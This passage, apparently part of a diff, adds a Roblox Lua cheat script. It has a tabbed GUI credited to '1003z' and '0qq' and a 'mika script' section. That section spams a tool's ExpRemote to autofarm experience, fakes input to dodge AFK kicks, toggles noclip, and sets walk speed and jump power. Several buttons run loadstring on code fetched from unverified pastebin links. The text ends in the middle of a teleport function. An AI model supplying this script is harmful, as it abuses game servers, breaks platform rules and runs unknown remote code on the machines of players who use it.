+flingplr.Position = UDim2.new(0.496402889, 0, 0.363248974, 0)
+flingplr.Size = UDim2.new(0, 164, 0, 40)
+flingplr.Font = Enum.Font.SourceSans
+flingplr.Text = "Set game time"
+flingplr.TextColor3 = Color3.fromRGB(0, 0, 0)
+flingplr.TextSize = 27.000
+
+UICorner_33.Parent = flingplr
+
+killtx.Name = "killtx"
+killtx.Parent = MiniFrame4
+killtx.BackgroundColor3 = Color3.fromRGB(164, 179, 179)
+killtx.BorderColor3 = Color3.fromRGB(0, 0, 0)
+killtx.BorderSizePixel = 0
+killtx.Position = UDim2.new(0.0359712243, 0, 0.220095694, 0)
+killtx.Size = UDim2.new(0, 164, 0, 29)
+killtx.Font = Enum.Font.SourceSans
+killtx.Text = "Enter command (cmd)"
+killtx.TextColor3 = Color3.fromRGB(0, 0, 0)
+killtx.TextSize = 14.000
+
+flingtx.Name = "flingtx"
+flingtx.Parent = MiniFrame4
+flingtx.BackgroundColor3 = Color3.fromRGB(164, 179, 179)
+flingtx.BorderColor3 = Color3.fromRGB(0, 0, 0)
+flingtx.BorderSizePixel = 0
+flingtx.Position = UDim2.new(0.496402889, 0, 0.220095694, 0)
+flingtx.Size = UDim2.new(0, 164, 0, 29)
+flingtx.Font = Enum.Font.SourceSans
+flingtx.Text = "Enter game time"
+flingtx.TextColor3 = Color3.fromRGB(0, 0, 0)
+flingtx.TextSize = 14.000
+
+exit.Name = "exit"
+exit.Parent = MiniFrame4
+exit.BackgroundColor3 = Color3.fromRGB(190, 18, 18)
+exit.BackgroundTransparency = 0.350
+exit.BorderColor3 = Color3.fromRGB(0, 0, 0)
+exit.BorderSizePixel = 0
+exit.Position = UDim2.new(0.429256588, 0, 0.832148492, 0)
+exit.Size = UDim2.new(0, 38, 0, 35)
+exit.Font = Enum.Font.SourceSans
+exit.Text = "X"
+exit.TextColor3 = Color3.fromRGB(0, 0, 0)
+exit.TextSize = 27.000
+
+TextLabel_6.Parent = MiniFrame4
+TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.BackgroundTransparency = 1.000
+TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_6.BorderSizePixel = 0
+TextLabel_6.Position = UDim2.new(0.494084567, 0, 0.0323445462, 0)
+TextLabel_6.Size = UDim2.new(0, 192, 0, 39)
+TextLabel_6.Font = Enum.Font.SourceSans
+TextLabel_6.Text = "day/night/evening/rtx/space/            1 -24"
+TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_6.TextScaled = true
+TextLabel_6.TextSize = 14.000
+TextLabel_6.TextWrapped = true
+
+TextLabel_7.Parent = MiniFrame4
+TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_7.BackgroundTransparency = 1.000
+TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_7.BorderSizePixel = 0
+TextLabel_7.Position = UDim2.new(0.566026986, 0, 0.553875625, 0)
+TextLabel_7.Size = UDim2.new(0, 171, 0, 40)
+TextLabel_7.Font = Enum.Font.SourceSans
+TextLabel_7.Text = "type \"space\" then \"day\" for a special night sky"
+TextLabel_7.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_7.TextScaled = true
+TextLabel_7.TextSize = 14.000
+TextLabel_7.TextWrapped = true
+
+TextLabel_8.Parent = MiniFrame4
+TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_8.BackgroundTransparency = 1.000
+TextLabel_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_8.BorderSizePixel = 0
+TextLabel_8.Position = UDim2.new(0.551638544, 0, 0.745263219, 0)
+TextLabel_8.Size = UDim2.new(0, 177, 0, 45)
+TextLabel_8.Font = Enum.Font.SourceSans
+TextLabel_8.Text = "After typing \"rtx\", type \"exit\" to fix the blur"
+TextLabel_8.TextColor3 = Color3.fromRGB(8, 0, 255)
+TextLabel_8.TextScaled = true
+TextLabel_8.TextSize = 14.000
+TextLabel_8.TextWrapped = true
+
+TabButton5.Name = "TabButton5"
+TabButton5.Parent = MainFrame
+TabButton5.BackgroundColor3 = Color3.fromRGB(88, 79, 75)
+TabButton5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TabButton5.BorderSizePixel = 0
+TabButton5.Position = UDim2.new(0.793323696, 0, 0.858181715, 0)
+TabButton5.Size = UDim2.new(0, 112, 0, 29)
+TabButton5.Font = Enum.Font.SourceSans
+TabButton5.Text = "Info"
+TabButton5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TabButton5.TextSize = 32.000
+
+UICorner_34.Parent = TabButton5
+
+MiniFrame5.Name = "MiniFrame5"
+MiniFrame5.Parent = MainFrame
+MiniFrame5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MiniFrame5.BackgroundTransparency = 0.700
+MiniFrame5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+MiniFrame5.BorderSizePixel = 0
+MiniFrame5.Position = UDim2.new(0.0110905729, 0, 0.203636304, 0)
+MiniFrame5.Size = UDim2.new(0, 415, 0, 208)
+
+infom.Name = "infom"
+infom.Parent = MiniFrame5
+infom.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+infom.BackgroundTransparency = 1.000
+infom.BorderColor3 = Color3.fromRGB(0, 0, 0)
+infom.BorderSizePixel = 0
+infom.Position = UDim2.new(0.0240963846, 0, 0.052884616, 0)
+infom.Size = UDim2.new(0, 396, 0, 49)
+infom.Font = Enum.Font.SourceSans
+infom.Text = "Script and gui made by 1003z"
+infom.TextColor3 = Color3.fromRGB(0, 0, 0)
+infom.TextSize = 39.000
+
+infom_2.Name = "infom"
+infom_2.Parent = MiniFrame5
+infom_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+infom_2.BackgroundTransparency = 1.000
+infom_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+infom_2.BorderSizePixel = 0
+infom_2.Position = UDim2.new(0.0216867477, 0, 0.274038464, 0)
+infom_2.Size = UDim2.new(0, 396, 0, 49)
+infom_2.Font = Enum.Font.SourceSans
+infom_2.Text = "Gui made by 1003z"
+infom_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+infom_2.TextSize = 39.000
+
+infom_3.Name = "infom"
+infom_3.Parent = MiniFrame5
+infom_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+infom_3.BackgroundTransparency = 1.000
+infom_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+infom_3.BorderSizePixel = 0
+infom_3.Position = UDim2.new(0.0240963846, 0, 0.475961536, 0)
+infom_3.Size = UDim2.new(0, 396, 0, 49)
+infom_3.Font = Enum.Font.SourceSans
+infom_3.Text = "10% of the scripts are 0qq's"
+infom_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+infom_3.TextSize = 39.000
+
+ProfilePicture.Name = "ProfilePicture"
+ProfilePicture.Parent = MiniFrame5
+ProfilePicture.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ProfilePicture.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ProfilePicture.BorderSizePixel = 0
+ProfilePicture.Position = UDim2.new(0.0239809342, 0, 0.711538434, 0)
+ProfilePicture.Size = UDim2.new(0, 56, 0, 59)
+ProfilePicture.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+
+ProfilePicture2.Name = "ProfilePicture2"
+ProfilePicture2.Parent = MiniFrame5
+ProfilePicture2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ProfilePicture2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ProfilePicture2.BorderSizePixel = 0
+ProfilePicture2.Position = UDim2.new(0.498679727, 0, 0.721153855, 0)
+ProfilePicture2.Size = UDim2.new(0, 56, 0, 59)
+ProfilePicture2.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+
+_0qqinfotext.Name = "0qqinfotext"
+_0qqinfotext.Parent = MiniFrame5
+_0qqinfotext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_0qqinfotext.BackgroundTransparency = 1.000
+_0qqinfotext.BorderColor3 = Color3.fromRGB(0, 0, 0)
+_0qqinfotext.BorderSizePixel = 0
+_0qqinfotext.Position = UDim2.new(0.183132529, 0, 0.711538434, 0)
+_0qqinfotext.Size = UDim2.new(0, 130, 0, 58)
+_0qqinfotext.Font = Enum.Font.SourceSans
+_0qqinfotext.Text = "0qq (@KAKOYTO_LOXX)"
+_0qqinfotext.TextColor3 = Color3.fromRGB(0, 0, 0)
+_0qqinfotext.TextScaled = true
+_0qqinfotext.TextSize = 16.000
+_0qqinfotext.TextWrapped = true
+
+_1003zinfottetx.Name = "1003zinfottetx"
+_1003zinfottetx.Parent = MiniFrame5
+_1003zinfottetx.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_1003zinfottetx.BackgroundTransparency = 1.000
+_1003zinfottetx.BorderColor3 = Color3.fromRGB(0, 0, 0)
+_1003zinfottetx.BorderSizePixel = 0
+_1003zinfottetx.Position = UDim2.new(0.686747015, 0, 0.725961566, 0)
+_1003zinfottetx.Size = UDim2.new(0, 130, 0, 58)
+_1003zinfottetx.Font = Enum.Font.SourceSans
+_1003zinfottetx.Text = "1003z (@mkl73lol)"
+_1003zinfottetx.TextColor3 = Color3.fromRGB(0, 0, 0)
+_1003zinfottetx.TextScaled = true
+_1003zinfottetx.TextSize = 30.000
+_1003zinfottetx.TextWrapped = true
+
+ProfilePicture_2.Name = "ProfilePicture"
+ProfilePicture_2.Parent = MainFrame
+ProfilePicture_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ProfilePicture_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ProfilePicture_2.BorderSizePixel = 0
+ProfilePicture_2.Position = UDim2.new(0.354101419, 0, -0.000410711102, 0)
+ProfilePicture_2.Size = UDim2.new(0, 45, 0, 47)
+ProfilePicture_2.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+
+Open.Name = "Open"
+Open.Parent = ScreenGui
+Open.BackgroundColor3 = Color3.fromRGB(134, 92, 126)
+Open.BackgroundTransparency = 0.450
+Open.BorderColor3 = Color3.fromRGB(253, 255, 252)
+Open.BorderSizePixel = 0
+Open.Position = UDim2.new(0.920964062, 0, 0.517452002, 0)
+Open.Size = UDim2.new(0, 103, 0, 33)
+Open.Font = Enum.Font.ArialBold
+Open.Text = "Open"
+Open.TextColor3 = Color3.fromRGB(255, 255, 255)
+Open.TextSize = 25.000
+
+UICorner_35.Parent = Open
+
+-- Scripts:
+
+local function UBQN_script() 
+	local script = Instance.new('LocalScript', MainFrame)
+
+	local textLabel = script.Parent:WaitForChild("TextLabel")
+	
+	local player = game.Players.LocalPlayer
+	
+	textLabel.Text = "Welcome, " .. player.DisplayName
+	
+	textLabel.Size = UDim2.new(0, 200, 0, 50) 
+	textLabel.Position = UDim2.new{-0, 0},{-0.12, 10}
+	textLabel.BackgroundColor3 = Color3.new(0, 0, 0) 
+	textLabel.TextColor3 = Color3.new(1, 1, 1) 
+	textLabel.Font = Enum.Font.SourceSans 
+	textLabel.TextSize = 24 
+	textLabel.BackgroundTransparency = 0.5
+	
+end
+coroutine.wrap(UBQN_script)()
+local function TYNQWGY_script() 
+	local script = Instance.new('LocalScript', MainFrame)
+
+	local screenGui = script.Parent
+	local imageLabel = screenGui:WaitForChild("ProfilePicture")
+	
+	local player = game.Players.LocalPlayer
+	
+	if player and imageLabel then
+		imageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. player.UserId .. "&w=180&h=180"
+	
+		imageLabel.Size = UDim2.new(0, 70, 0, 68) 
+		imageLabel.Position = UDim2.new(0.354, 0, -0.06, 0) 
+		imageLabel.BackgroundTransparency = 1 
+	else
+		warn("Player or ImageLabel not found!")
+	end
+	
+end
+coroutine.wrap(TYNQWGY_script)()
+local function AVTU_script()  
+	local script = Instance.new('LocalScript', MiniFrame1)
+
+	
+	local frame = script.Parent 
+	
+	local rainbowColors = {
+		Color3.fromRGB(0, 255, 0),      
+		Color3.fromRGB(0, 255, 255),     
+		Color3.fromRGB(0, 0, 255),      
+		Color3.fromRGB(0, 0, 139)         
+	}
+	
+	local transitionTime = 1  
+	
+	local function transitionColor()
+		while true do
+			for i = 1, #rainbowColors - 1 do
+				local startColor = rainbowColors[i]
+				local endColor = rainbowColors[i + 1]
+				local steps = 50 
+				local stepTime = transitionTime / steps
+	
+				for step = 1, steps do
+					local lerpedColor = startColor:Lerp(endColor, step / steps)
+					frame.BackgroundColor3 = lerpedColor
+					wait(stepTime)
+				end
+			end
+		end
+	end
+	
+	transitionColor()
+	
+end
+coroutine.wrap(AVTU_script)()
+local function ZYCNHA_script()
+	local script = Instance.new('LocalScript', TabButton2)
+
+	local Textbox = script.Parent 
+	
+	local rainbowColors = {
+		Color3.fromRGB(255, 20, 147),   
+		Color3.fromRGB(128, 0, 128),    
+		Color3.fromRGB(255, 0, 0),
+		Color3.fromRGB(123, 74, 135)
+	}
+	
+	local transitionTime = 5
+	
+	local function transitionColor()
+		while true do
+			for i = 1, #rainbowColors - 1 do
+				local startColor = rainbowColors[i]
+				local endColor = rainbowColors[i + 1]
+				local steps = 50  
+				local stepTime = transitionTime / steps
+	
+				for step = 1, steps do
+					local lerpedColor = startColor:Lerp(endColor, step / steps)
+					Textbox.BackgroundColor3 = lerpedColor
+					wait(stepTime)
+				end
+			end
+		end
+	end
+	
+	transitionColor()
+	
+end
+coroutine.wrap(ZYCNHA_script)()
+local function GVGMCFG_script()
+	local script = Instance.new('LocalScript', TabButton1)
+
+	
+	local TextButton = script.Parent 
+	
+	local rainbowColors = {
+		Color3.fromRGB(0, 255, 0),        
+		Color3.fromRGB(0, 255, 255),    
+		Color3.fromRGB(0, 0, 255),       
+		Color3.fromRGB(0, 0, 139)         
+	}
+	
+	local transitionTime = 5 
+	
+	local function transitionColor()
+		while true do
+			for i = 1, #rainbowColors - 1 do
+				local startColor = rainbowColors[i]
+				local endColor = rainbowColors[i + 1]
+				local steps = 50 
+				local stepTime = transitionTime / steps
+	
+				for step = 1, steps do
+					local lerpedColor = startColor:Lerp(endColor, step / steps)
+					TextButton.BackgroundColor3 = lerpedColor
+					wait(stepTime)
+				end
+			end
+		end
+	end
+	
+	transitionColor()
+	
+end
+coroutine.wrap(GVGMCFG_script)()
+local function YPWZBNH_script()
+	local script = Instance.new('LocalScript', MainFrame)
+
+	local MainFrame = script.Parent
+	local TabButton1 = MainFrame:WaitForChild("TabButton1")
+	local TabButton2 = MainFrame:WaitForChild("TabButton2")
+	local TabButton3 = MainFrame:WaitForChild("TabButton3")
+	local TabButton4 = MainFrame:WaitForChild("TabButton4")
+	local TabButton5 = MainFrame:WaitForChild("TabButton5")
+	local MiniFrame1 = MainFrame:WaitForChild("MiniFrame1")
+	local MiniFrame2 = MainFrame:WaitForChild("MiniFrame2")
+	local MiniFrame3 = MainFrame:WaitForChild("MiniFrame3")
+	local MiniFrame4 = MainFrame:WaitForChild("MiniFrame4")
+	local MiniFrame5 = MainFrame:WaitForChild("MiniFrame5")
+	
+	local function showFrame(selectedFrame)
+		for _, frame in ipairs(MainFrame:GetChildren()) do
+			if frame:IsA("Frame") and frame.Name:match("MiniFrame") then
+				frame.Visible = false
+			end
+		end
+		selectedFrame.Visible = true
+	end
+	
+	TabButton1.MouseButton1Click:Connect(function()
+		showFrame(MiniFrame1)
+	end)
+	
+	TabButton2.MouseButton1Click:Connect(function()
+		showFrame(MiniFrame2)
+	end)
+	
+	TabButton3.MouseButton1Click:Connect(function()
+		showFrame(MiniFrame3)
+	end)
+	
+	TabButton4.MouseButton1Click:Connect(function()
+		showFrame(MiniFrame4)
+	end)
+	
+	TabButton5.MouseButton1Click:Connect(function()
+		showFrame(MiniFrame5)
+	end)
+	
+	showFrame(MiniFrame1)
+	
+	
+end
+coroutine.wrap(YPWZBNH_script)()
+local function VOPWTO_script()
+	local script = Instance.new('LocalScript', MiniFrame2)
+
+	local frame = script.Parent 
+	
+	local rainbowColors = {
+		Color3.fromRGB(255, 20, 147),   
+		Color3.fromRGB(128, 0, 128),    
+		Color3.fromRGB(255, 0, 0),
+		Color3.fromRGB(123, 74, 135)
+	}
+	
+	local transitionTime = 1 
+	
+	local function transitionColor()
+		while true do
+			for i = 1, #rainbowColors - 1 do
+				local startColor = rainbowColors[i]
+				local endColor = rainbowColors[i + 1]
+				local steps = 50  
+				local stepTime = transitionTime / steps
+	
+				for step = 1, steps do
+					local lerpedColor = startColor:Lerp(endColor, step / steps)
+					frame.BackgroundColor3 = lerpedColor
+					wait(stepTime)
+				end
+			end
+		end
+	end
+	
+	transitionColor()
+	
+end
+coroutine.wrap(VOPWTO_script)()
+local function FDIRS_script()
+	local script = Instance.new('LocalScript', TextLabel_4)
+
+	local UserInputService = game:GetService("UserInputService")
+	local mainFrame = script.Parent.Parent
+	
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+	
+	local function update(input)
+		local delta = input.Position - dragStart
+		mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+	
+	script.Parent.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = mainFrame.Position
+	
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	script.Parent.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	
+	UserInputService.InputChanged:Connect(function(input)
+		if dragging and input == dragInput then
+			update(input)
+		end
+	end)
+	
+end
+coroutine.wrap(FDIRS_script)()
+local function PMYMP_script()
+	local script = Instance.new('LocalScript', infom)
+
+	local textLabel = script.Parent
+	local hue = 0
+	
+	local function updateRainbowText()
+		hue = hue + 1
+		if hue > 360 then
+			hue = 0
+		end
+	
+		local color = Color3.fromHSV(hue/360, 1, 1)
+		textLabel.TextColor3 = color
+	end
+	
+	while true do
+		updateRainbowText()
+		wait(0.1)
+	end
+	
+end
+coroutine.wrap(PMYMP_script)()
+local function DHIE_script()
+	local script = Instance.new('LocalScript', infom_2)
+
+	local textLabel = script.Parent
+	local hue = 0
+	
+	local function updateRainbowText()
+		hue = hue + 1
+		if hue > 360 then
+			hue = 0
+		end
+	
+		local color = Color3.fromHSV(hue/360, 1, 1)
+		textLabel.TextColor3 = color
+	end
+	
+	while true do
+		updateRainbowText()
+		wait(0.1)
+	end
+	
+end
+coroutine.wrap(DHIE_script)()
+local function FDEBRE_script()
+	local script = Instance.new('LocalScript', infom_3)
+
+	local textLabel = script.Parent
+	local hue = 0
+	
+	local function updateRainbowText()
+		hue = hue + 1
+		if hue > 360 then
+			hue = 0
+		end
+	
+		local color = Color3.fromHSV(hue/360, 1, 1)
+		textLabel.TextColor3 = color
+	end
+	
+	while true do
+		updateRainbowText()
+		wait(0.1)
+	end
+	
+end
+coroutine.wrap(FDEBRE_script)()
+local function UYTQ_script()
+	local script = Instance.new('LocalScript', MiniFrame5)
+
+	local screenGui = script.Parent
+	local imageLabel = screenGui:WaitForChild("ProfilePicture")
+	
+	local playerUserId = 1354293859
+	
+	if imageLabel then
+		print("ImageLabel found")
+		imageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. playerUserId .. "&w=180&h=180"
+		imageLabel.Size = UDim2.new(0, 100, 0, 100) 
+		imageLabel.Position = UDim2.new(0.001, 0, 0.500, 0) 
+		imageLabel.BackgroundTransparency = 1 
+		print("ImageLabel properties set")
+	else
+		warn("ImageLabel not found!")
+	end
+	
+end
+coroutine.wrap(UYTQ_script)()
+local function OGJA_script() 
+	local script = Instance.new('LocalScript', MiniFrame5)
+
+	local screenGui = script.Parent
+	local imageLabel = screenGui:WaitForChild("ProfilePicture2")
+	
+	local playerUserId = 1244024451
+	
+	if imageLabel then
+		print("ImageLabel found")
+		imageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. playerUserId .. "&w=180&h=180"
+		imageLabel.Size = UDim2.new(0, 100, 0, 100) 
+		imageLabel.Position = UDim2.new(0.499, 0, 0.500, 0) 
+		imageLabel.BackgroundTransparency = 1 
+		print("ImageLabel properties set")
+	else
+		warn("ImageLabel not found!")
+	end
+	
+end
+coroutine.wrap(OGJA_script)()
+local function AENZO_script() 
+	local script = Instance.new('LocalScript', ScreenGui)
+
+	local SGui = script.Parent
+	local Frame = SGui:WaitForChild("MainFrame")
+	local Button = SGui:WaitForChild("Open")
+	
+	Button.MouseButton1Up:Connect(function()
+		Frame.Visible = not Frame.Visible
+	end)
+	
+	local SGui = script.Parent
+	local Frame = SGui:WaitForChild("Frame1")
+	local Button = SGui:WaitForChild("ForFrame1")
+	
+	Button.MouseButton1Up:Connect(function()
+		Frame.Visible = not Frame.Visible
+	end)
+	
+	
+end
+coroutine.wrap(AENZO_script)()
+
+-- mika script :
+
+local autofireEnabled = false
+local newScriptConnection
+local RunService = game:GetService("RunService")
+local plr = game.Players.LocalPlayer
+local vu = game:GetService("VirtualUser")
+
+local function autoFire()
+    if plr.Character then
+        local tool = plr.Character:FindFirstChildOfClass("Tool")
+        if tool and tool.Name ~= "Tnt" and tool:FindFirstChild("ExpRemote") then
+            local expRemote = tool.ExpRemote
+            local numFires = getgenv().mika
+            local batchSize = 20 
+            local numBatches = math.ceil(numFires / batchSize)
+
+            for i = 1, numBatches do
+                local args = {}
+                local firesThisBatch = math.min(batchSize, numFires - (i - 1) * batchSize)
+                for j = 1, firesThisBatch do
+                    table.insert(args, nil)
+                end
+                expRemote:FireServer(unpack(args))
+            end
+        end
+    end
+end
+
+Autofarm.MouseButton1Click:Connect(function()
+    autofireEnabled = not autofireEnabled
+    if autofireEnabled then
+        Autofarm.Text = "on"
+        Autofarm.BackgroundColor3 = Color3.fromRGB(207, 213, 213)
+
+        getgenv().fr7 = true
+        getgenv().mika = 50
+        getgenv().mikaa = true
+
+        newScriptConnection = RunService.RenderStepped:Connect(function()
+            pcall(autoFire)
+        end)
+
+        spawn(function()
+            while autofireEnabled do
+                wait(1)
+                if getgenv().fr7 and getgenv().pingval > 1000 then
+                    getgenv().mikaa = false
+                elseif getgenv().fr7 and getgenv().pingval < 1000 then
+                    getgenv().mikaa = true
+                end
+            end
+        end)
+    else
+        Autofarm.Text = "off"
+        Autofarm.BackgroundColor3 = Color3.fromRGB(207, 213, 213) 
+
+        getgenv().fr7 = false
+        if newScriptConnection then
+            newScriptConnection:Disconnect()
+            newScriptConnection = nil
+        end
+    end
+end)
+
+Autofarmop.MouseButton1Click:Connect(function()
+    autofireEnabled = not autofireEnabled
+    if autofireEnabled then
+        Autofarmop.Text = "Autofarm [high ping]"
+        Autofarmop.BackgroundColor3 = Color3.fromRGB(161, 213, 205)
+
+        getgenv().fr7 = true
+        getgenv().mika = 6000
+        getgenv().mikaa = true
+
+        newScriptConnection = RunService.RenderStepped:Connect(function()
+            pcall(autoFire)
+        end)
+
+        spawn(function()
+            while autofireEnabled do
+                wait(1)
+                if getgenv().fr7 and getgenv().pingval > 1000 then
+                    getgenv().mikaa = false
+                elseif getgenv().fr7 and getgenv().pingval < 1000 then
+                    getgenv().mikaa = true
+                end
+            end
+        end)
+    else
+        Autofarmop.Text = "Autofarm [high ping]"
+        Autofarmop.BackgroundColor3 = Color3.fromRGB(161, 213, 205) 
+
+        getgenv().fr7 = false
+        if newScriptConnection then
+            newScriptConnection:Disconnect()
+            newScriptConnection = nil
+        end
+    end
+end)
+
+getgenv().aa = false
+
+local function updateButtonText()
+    if getgenv().aa then
+        antiafk.Text = "On"
+    else
+        antiafk.Text = "Off"
+    end
+end
+
+local function toggleAntiAFK()
+    getgenv().aa = not getgenv().aa
+    
+    updateButtonText()
+    
+    print("1003z's Anti Afk is ", getgenv().aa and "On" or "Off")
+    
+    if getgenv().aa then
+        spawn(function()
+            while getgenv().aa do
+                wait(10)
+                
+                if getgenv().aa then
+                    local vu = game:GetService("VirtualUser")
+                    
+                    vu:CaptureController()
+                    vu:ClickButton2(Vector2.new(0, 0))
+                end
+            end
+        end)
+    end
+end
+
+updateButtonText()
+
+antiafk.MouseButton1Click:Connect(function()
+    toggleAntiAFK()
+end)
+
+getgenv().noClipEnabled = false
+
+local function toggleNoClip()
+    getgenv().noClipEnabled = not getgenv().noClipEnabled
+    
+    print("Mikaa's ANTIFLING is ", getgenv().noClipEnabled and "on" or "off")
+    
+    local character = game.Players.LocalPlayer.Character
+    
+    if character then
+        for _, part in ipairs(character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = not getgenv().noClipEnabled
+            end
+        end
+    end
+end
+
+antifling.MouseButton1Click:Connect(function()
+    toggleNoClip()
+    
+    antifling.Text = getgenv().noClipEnabled and "On" or "Off"
+end)
+
+humanroll.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/jGqC1KhC'))() 
+end)
+
+
+local function toggleFreeze()
+    local player = game.Players.LocalPlayer
+    local character = player.Character
+
+    if character then
+        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+        if humanoidRootPart then
+            humanoidRootPart.Anchored = not humanoidRootPart.Anchored
+            if humanoidRootPart.Anchored then
+                freeze.Text = "Freeze On"
+                freeze.BackgroundColor3 = Color3.fromRGB(213, 144, 151)
+            else
+                freeze.Text = "Freeze Off"
+                freeze.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
+            end
+        end
+    end
+end
+
+freeze.MouseButton1Click:Connect(toggleFreeze)
+
+
+
+local function changeSpeed()
+    local speed = tonumber(wsbox.Text)
+    if speed and speed > 0 then
+        local player = game.Players.LocalPlayer
+        local character = player.Character or player.CharacterAdded:Wait()
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = speed
+        else
+            warn("Humanoid not found.")
+        end
+    else
+        warn("Invalid speed value entered.")
+    end
+end
+
+wsb.MouseButton1Click:Connect(changeSpeed)
+
+
+local function changeJumpPower()
+    local jumpPower = tonumber(jpbox.Text)
+    if jumpPower and jumpPower > 0 then
+        local player = game.Players.LocalPlayer
+        local character = player.Character or player.CharacterAdded:Wait()
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.JumpPower = jumpPower
+        else
+            warn("Humanoid not found.")
+        end
+    else
+        warn("Invalid jump power value entered.")
+    end
+end
+
+jpb.MouseButton1Click:Connect(changeJumpPower)
+
+iy.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/kHmb8tSf'))() 
+end)
+
+
+getgenv().noclip = false
+
+local function toggleNoClip()
+    getgenv().noClipEnabled = not getgenv().noClipEnabled
+    
+    print("Mikaa's not clip is ", getgenv().noClipEnabled and "on" or "off")
+    
+    local character = game.Players.LocalPlayer.Character
+    
+    if character then
+        for _, part in ipairs(character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = not getgenv().noClipEnabled
+            end
+        end
+    end
+end
+
+noclip.MouseButton1Click:Connect(function()
+    toggleNoClip()
+    
+    noclip.Text = getgenv().noClipEnabled and "On" or "Off"
+end)
+
+
+
+local originalTextures = {}
+
+local function removeTextures()
+    for _, texture in pairs(game:GetDescendants()) do
+        if texture:IsA("Texture") or texture:IsA("Decal") then
+            table.insert(originalTextures, {parent = texture.Parent, texture = texture:Clone()})
+            texture:Destroy()
+        end
+    end
+end
+
+local function restoreTextures()
+    for _, item in pairs(originalTextures) do
+        item.texture.Parent = item.parent
+    end
+    originalTextures = {}
+end
+
+local function optimizeSettings()
+    local lighting = game:GetService("Lighting")
+    lighting.GlobalShadows = false
+    lighting.FogEnd = 9e9
+    lighting.Brightness = 0
+    lighting.OutdoorAmbient = Color3.new(0, 0, 0)
+    lighting.TimeOfDay = "14:00:00"
+    
+    local settings = UserSettings():GetService("UserGameSettings")
+    settings.MasterVolume = 0
+end
+
+local function resetSettings()
+    local lighting = game:GetService("Lighting")
+    lighting.GlobalShadows = true
+    lighting.FogEnd = 100000
+    lighting.Brightness = 1
+    lighting.OutdoorAmbient = Color3.new(127/255, 127/255, 127/255)
+    lighting.TimeOfDay = "14:00:00"
+    
+    local settings = UserSettings():GetService("UserGameSettings")
+    settings.MasterVolume = 0.5
+end
+
+local isBoosterEnabled = false
+
+fps.MouseButton1Click:Connect(function()
+    isBoosterEnabled = not isBoosterEnabled
+    if isBoosterEnabled then
+        removeTextures()
+        optimizeSettings()
+        fps.Text = "On"
+    else
+        restoreTextures()
+        resetSettings()
+        fps.Text = "Off"
+    end
+end)
+
+game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+    Text = "Thanks for using my script :3";
+    Color = Color3.new(0, 10, 10);
+    Font = Enum.Font.SourceSansBold;
+    TextSize = 20;
+})
+
+game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+    Text = "<3";
+    Color = Color3.new(1, 0, 1);
+    Font = Enum.Font.SourceSansBold;
+    TextSize = 20;
+})
+
+game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+    Text = "https://discord.gg/C9JhKkY4cB";
+    Color = Color3.new(1, 0, 0);
+    Font = Enum.Font.SourceSansBold;
+    TextSize = 20;
+})
+
+spy.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/kV8dhSB6'))() 
+end)
+
+local UIS = game:GetService("UserInputService")
+local Player = game.Players.LocalPlayer 
+local Mouse = Player:GetMouse() 
+function GetCharacter() 
+return game.Players.LocalPlayer.Character 
+end 
+function Teleport(pos) 
+local Char = GetCharacter() 
